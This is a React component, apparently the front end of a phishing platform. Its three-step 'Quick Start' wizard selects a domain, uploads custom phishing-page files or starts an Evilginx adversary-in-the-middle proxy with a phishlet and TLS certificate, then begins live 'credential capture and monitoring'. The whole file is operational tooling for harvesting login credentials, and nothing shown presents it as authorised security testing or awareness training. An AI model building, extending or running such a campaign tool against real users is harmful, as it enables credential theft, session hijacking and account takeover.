import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { API_ENDPOINTS, fetchApi } from '../api';

function StartPhishing() {
  const navigate = useNavigate();
  const [currentStep, setCurrentStep] = useState(1);
  const totalSteps = 3; // Reduced to just 3 steps
  const [domains, setDomains] = useState([]);
  const [phishlets, setPhishlets] = useState([]);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState({ type: '', text: '' });
  const [files, setFiles] = useState([]);
  const [isDragging, setIsDragging] = useState(false);
  const [crtFile, setCrtFile] = useState(null);
  const [keyFile, setKeyFile] = useState(null);
  const [isCertUploaded, setIsCertUploaded] = useState(false);

  // Form state
  const [formData, setFormData] = useState({
    campaignName: 'Campaign ' + new Date().toISOString().slice(0, 10),
    domain: '',
    phishingType: 'custom-site',
    phishlet: '',
    redirectUrl: 'https://google.com',
    ip: ''
  });

  useEffect(() => {
    // Fetch domains and phishlets on component mount
    fetchDomains();
    fetchPhishlets();
  }, []);

  const fetchDomains = () => {
    fetchApi(API_ENDPOINTS.domain.list)
      .then(data => {
        if (data.status === 'success') {
          setDomains(data.domains);
          // Auto-select the first domain if available
          if (data.domains.length > 0) {
            setFormData(prev => ({
              ...prev,
              domain: data.domains[0].domain
            }));
          }
        }
      })
      .catch(error => {
        console.error('Error fetching domains:', error);
        setMessage({ type: 'error', text: 'Failed to fetch domains. Please try again.' });
      });
  };

  const fetchPhishlets = () => {
    fetchApi(API_ENDPOINTS.evilginx.phishlets)
      .then(data => {
        if (data.status === 'success') {
          setPhishlets(data.phishlets);
          // Auto-select the first phishlet if available
          if (data.phishlets.length > 0) {
            setFormData(prev => ({
              ...prev,
              phishlet: data.phishlets[0]
            }));
          }
        }
      })
      .catch(error => {
        console.error('Error fetching phishlets:', error);
      });
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
  };

  const handleFileChange = (e) => {
    setFiles([...e.target.files]);
  };

  const handleDrop = (e) => {
    e.preventDefault();
    e.stopPropagation();
    setIsDragging(false);
    setFiles([...e.dataTransfer.files]);
  };

  const handleDragOver = (e) => {
    e.preventDefault();
    e.stopPropagation();
    setIsDragging(true);
  };

  const handleDragLeave = (e) => {
    e.preventDefault();
    e.stopPropagation();
    setIsDragging(false);
  };

  const handleRemoveFile = (index) => {
    setFiles(prevFiles => prevFiles.filter((_, i) => i !== index));
  };

  const handleUploadCerts = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMessage({ type: '', text: '' });
  
    try {
      const certForm = new FormData();
      certForm.append("domain", formData.domain);
      certForm.append("phishlet", formData.phishlet);
      certForm.append("crt", crtFile);
      certForm.append("key", keyFile);
  
      const certUploadRes = await fetch(API_ENDPOINTS.evilginx.uploadCerts, {
        method: "POST",
        body: certForm
      }).then(res => res.json());
  
      if (certUploadRes.status === "success") {
        setIsCertUploaded(true);
        setMessage({ type: "success", text: "Certificates uploaded successfully!" });
        setTimeout(() => {
          setMessage({ type: '', text: '' });
          startEvilginx(); // Automatically start Evilginx after cert upload
        }, 1500);
      } else {
        throw new Error(certUploadRes.message || "Certificate upload failed.");
      }
    } catch (err) {
      setIsCertUploaded(false);
      setMessage({ type: "error", text: err.message });
      setLoading(false);
    }
  };

  const nextStep = () => {
    // Determine what to do based on current step
    if (currentStep === 1) {
      // Domain setup completed, move to phishing site setup
      setCurrentStep(2);
    } else if (currentStep === 2) {
      // Based on selected method, either upload files or start Evilginx
      if (formData.phishingType === 'custom-site') {
        uploadPhishingSite();
      } else {
        // For Evilginx, we need certificates first
        if (!crtFile || !keyFile) {
          setMessage({ 
            type: 'error', 
            text: 'Please upload both certificate (.crt) and key (.key) files.' 
          });
          return;
        }
        handleUploadCerts();
      }
    }
  };

  const uploadPhishingSite = () => {
    if (files.length === 0) {
      setMessage({ 
        type: 'error', 
        text: 'Please upload at least one file for your phishing site.' 
      });
      return;
    }

    setLoading(true);
    setMessage({ type: '', text: '' });

    const uploadData = new FormData();
    files.forEach(file => {
      uploadData.append('files', file);
    });
    uploadData.append('domainName', formData.domain);

    fetch(API_ENDPOINTS.phishing.upload, {
      method: 'POST',
      body: uploadData,
    })
      .then(response => response.json())
      .then(data => {
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: 'Phishing site uploaded successfully!'
          });
          
          // Move to the next step (Monitoring)
          setTimeout(() => {
            setCurrentStep(3);
            startMonitoring();
          }, 1500);
        } else {
          throw new Error(data.message || 'Upload failed');
        }
      })
      .catch(error => {
        console.error('Upload error', error);
        setLoading(false);
        setMessage({
          type: 'error',
          text: error.message || 'An error occurred during upload.'
        });
      });
  };

  const startEvilginx = () => {
    setLoading(true);
    setMessage({ type: '', text: '' });

    fetchApi(API_ENDPOINTS.evilginx.setup, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        domain: formData.domain,
        phishlet: formData.phishlet,
        ip: formData.ip,
        redirect_url: formData.redirectUrl
      }),
    })
      .then(data => {
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: 'Evilginx instance started successfully!'
          });
          
          // Move to the next step (Monitoring)
          setTimeout(() => {
            setCurrentStep(3);
            startMonitoring();
          }, 1500);
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to start Evilginx instance.'
          });
          setLoading(false);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        setLoading(false);
        setMessage({
          type: 'error',
          text: 'An error occurred while starting Evilginx instance.'
        });
      });
  };

  const startMonitoring = () => {
    setLoading(true);
    setMessage({ type: '', text: '' });

    fetchApi(API_ENDPOINTS.credentials.start, {
      method: 'POST'
    })
      .then(data => {
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: 'Monitoring started successfully!'
          });
          
          // After a short delay, redirect to monitoring page
          setTimeout(() => {
            navigate('/monitoring');
          }, 2000);
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to start monitoring.'
          });
          setLoading(false);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        setLoading(false);
        setMessage({
          type: 'error',
          text: 'An error occurred while starting monitoring.'
        });
      });
  };

  // Updated Progress indicator component
  const ProgressBar = () => {
    const steps = [
      "Domain Setup",
      formData.phishingType === 'custom-site' ? "Phishing Site Setup" : "Evilginx Setup",
      "Monitoring"
    ];
    
    const progressPercentage = (currentStep / totalSteps) * 100;
    
    return (
      <div className="campaign-progress">
        <div className="campaign-progress-header">
          <h3 className="campaign-progress-title">SETUP PROGRESS</h3>
          <span className="campaign-progress-counter">{currentStep}/{totalSteps}</span>
        </div>
        
        <div className="campaign-progress-bar">
          <div 
            className="campaign-progress-fill"
            style={{ width: `${progressPercentage}%` }}
          ></div>
        </div>
        
        <div className="campaign-progress-steps">
          {steps.map((step, index) => (
            <div 
              key={index}
              className={`campaign-step ${index < currentStep ? 'completed' : ''} ${index === currentStep - 1 ? 'active' : ''}`}
            >
              <span className="campaign-step-name">{step}</span>
            </div>
          ))}
        </div>
      </div>
    );
  };

  // Step 1: Domain Setup
  const DomainSetupStep = () => (
    <div>
      <h2 className="text-xl font-semibold mb-4">Domain Setup</h2>
      <p className="text-gray-600 mb-6">Select a domain and phishing method.</p>
      
      <div className="space-y-4">
        <div className="form-group">
          <label>Select Domain</label>
          <div className="flex space-x-4 mb-4">
            <select
              name="domain"
              value={formData.domain}
              onChange={handleChange}
              className="flex-1"
              required
            >
              <option value="">-- Select a domain --</option>
              {domains.map((domain, index) => (
                <option key={index} value={domain.domain}>{domain.domain}</option>
              ))}
            </select>
            
            <button 
              type="button"
              className="btn btn-outline"
              onClick={() => navigate('/domains')}
            >
              New Domain
            </button>
          </div>
        </div>
        
        <div className="form-group">
          <label>Phishing Method</label>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-2">
            <div 
              className={`p-4 border rounded cursor-pointer transition-all ${formData.phishingType === 'custom-site' ? 'border-primary bg-blue-50' : 'border-gray-200 hover:border-gray-300'}`}
              onClick={() => setFormData({...formData, phishingType: 'custom-site'})}
            >
              <div className="flex items-start">
                <div className={`w-5 h-5 rounded-full border flex items-center justify-center mr-3 mt-0.5 ${formData.phishingType === 'custom-site' ? 'border-primary' : 'border-gray-400'}`}>
                  {formData.phishingType === 'custom-site' && <div className="w-3 h-3 rounded-full bg-primary"></div>}
                </div>
                <div>
                  <h3 className="font-medium">Custom Phishing Site</h3>
                  <p className="text-sm text-gray-500 mt-1">Upload your custom phishing page files</p>
                </div>
              </div>
            </div>
            
            <div 
              className={`p-4 border rounded cursor-pointer transition-all ${formData.phishingType === 'evilginx' ? 'border-primary bg-blue-50' : 'border-gray-200 hover:border-gray-300'}`}
              onClick={() => setFormData({...formData, phishingType: 'evilginx'})}
            >
              <div className="flex items-start">
                <div className={`w-5 h-5 rounded-full border flex items-center justify-center mr-3 mt-0.5 ${formData.phishingType === 'evilginx' ? 'border-primary' : 'border-gray-400'}`}>
                  {formData.phishingType === 'evilginx' && <div className="w-3 h-3 rounded-full bg-primary"></div>}
                </div>
                <div>
                  <h3 className="font-medium">Evilginx Proxy</h3>
                  <p className="text-sm text-gray-500 mt-1">Use Evilginx with a pre-configured phishlet</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  // Step 2: Phishing Site or Evilginx Setup
  const PhishingSetupStep = () => (
    <div>
      <h2 className="text-xl font-semibold mb-4">
        {formData.phishingType === 'custom-site' ? 'Phishing Site Setup' : 'Evilginx Setup'}
      </h2>
      <p className="text-gray-600 mb-6">
        {formData.phishingType === 'custom-site' 
          ? 'Upload your phishing site files.' 
          : 'Configure your Evilginx proxy settings.'}
      </p>
      
      {formData.phishingType === 'custom-site' ? (
        <div className="space-y-6">
          <div className="form-group">
            <label>Phishing Site Files</label>
            <div
              onDrop={handleDrop}
              onDragOver={handleDragOver}
              onDragLeave={handleDragLeave}
              style={{
                border: '2px dashed gray',
                backgroundColor: isDragging ? '#f0f8ff' : 'transparent',
                boxShadow: isDragging ? '0 0 10px #00f' : 'none',
                padding: '20px',
                marginBottom: '20px',
                position: 'relative',
                transition: 'all 0.3s ease'
              }}
            >
              Drag & Drop files here or click to upload
              <input
                type="file"
                multiple
                onChange={handleFileChange}
                style={{
                  opacity: 0,
                  width: '100%',
                  height: '100%',
                  position: 'absolute',
                  top: 0,
                  left: 0,
                  cursor: 'pointer'
                }}
              />
            </div>
            {files.length > 0 && (
              <div style={{ marginTop: '15px', background: '#f9f9f9', borderRadius: '8px', padding: '10px' }}>
                <h4 style={{ marginBottom: '10px', fontWeight: '600', fontSize: '16px' }}>Selected Files</h4>
                <ul style={{ listStyleType: 'none', paddingLeft: '10px', margin: 0 }}>
                  {Array.from(files).map((file, idx) => (
                    <li key={idx} style={{ 
                      display: 'flex', 
                      alignItems: 'center', 
                      justifyContent: 'space-between', 
                      marginBottom: '5px', 
                      fontSize: '14px', 
                      color: '#333' 
                    }}>
                      <span>📄 {file.name}</span>
                      <button
                        type="button"
                        onClick={() => handleRemoveFile(idx)}
                        style={{
                          background: 'transparent',
                          border: 'none',
                          color: '#ff0000',
                          fontSize: '16px',
                          cursor: 'pointer',
                          marginLeft: '10px'
                        }}
                      >
                        ❌
                      </button>
                    </li>
                  ))}
                </ul>
              </div>
            )}
          </div>
        </div>
      ) : (
        <div className="space-y-6">
          <div className="form-group">
            <label htmlFor="phishlet">Phishlet</label>
            <select
              id="phishlet"
              name="phishlet"
              value={formData.phishlet}
              onChange={handleChange}
              required
            >
              <option value="">-- Select a phishlet --</option>
              {phishlets.map((phishlet, index) => (
                <option key={index} value={phishlet}>{phishlet}</option>
              ))}
            </select>
          </div>
          
          <div className="form-group">
            <label htmlFor="redirectUrl">Redirect URL</label>
            <input
              type="url"
              id="redirectUrl"
              name="redirectUrl"
              value={formData.redirectUrl}
              onChange={handleChange}
              placeholder="https://google.com"
              required
            />
          </div>
          
          <div className="form-group">
            <label htmlFor="ip">IP Address (Optional)</label>
            <input
              type="text"
              id="ip"
              name="ip"
              value={formData.ip}
              onChange={handleChange}
              placeholder="Leave blank to use server's public IP"
            />
          </div>
          
          <div className="form-group">
            <label>Certificate (.crt) File</label>
            <input type="file" accept=".crt" onChange={(e) => setCrtFile(e.target.files[0])} required />
          </div>

          <div className="form-group">
            <label>Key (.key) File</label>
            <input type="file" accept=".key" onChange={(e) => setKeyFile(e.target.files[0])} required />
          </div>
        </div>
      )}
    </div>
  );
  
  // Step 3: Monitoring (Progress)
  const MonitoringStep = () => (
    <div>
      <div className="text-center mb-8">
        <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-blue-100 text-blue-600 mb-4">
          <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" />
          </svg>
        </div>
        <h2 className="text-xl font-semibold mb-2">Setting Up Monitoring</h2>
        <p className="text-gray-600">Starting credential capture and monitoring...</p>
        
        <div className="mt-6">
          <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
            <div className="h-full bg-blue-500 rounded-full animate-pulse" style={{ width: '100%' }}></div>
          </div>
        </div>
      </div>
      
      <div className="alert alert-info">
        <h3 className="font-medium mb-2">What's happening?</h3>
        <ul className="list-disc list-inside text-sm space-y-1">
          <li>Setting up credential monitoring</li>
          <li>Configuring capture settings</li>
          <li>Preparing real-time credential dashboard</li>
        </ul>
      </div>
    </div>
  );
  
  // Render the current step
  const renderStep = () => {
    switch(currentStep) {
      case 1:
        return <DomainSetupStep />;
      case 2:
        return <PhishingSetupStep />;
      case 3:
        return <MonitoringStep />;
      default:
        return <DomainSetupStep />;
    }
  };
  
  return (
    <div className="start-phishing">
      <h1>Quick Start</h1>
      <p className="mb-4">Set up your phishing campaign in just a few steps.</p>
      
      <ProgressBar />
      
      {message.text && (
        <div className={`alert alert-${message.type}`}>
          {message.text}
        </div>
      )}
      
      <div className="card">
        {renderStep()}
        
        {currentStep < 3 && (
          <div className="mt-8 pt-5 border-t border-gray-200 flex justify-end">
            <button
              type="button"
              onClick={nextStep}
              className="btn"
              disabled={loading}
            >
              {loading ? 'Processing...' : 'Continue'}
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default StartPhishing;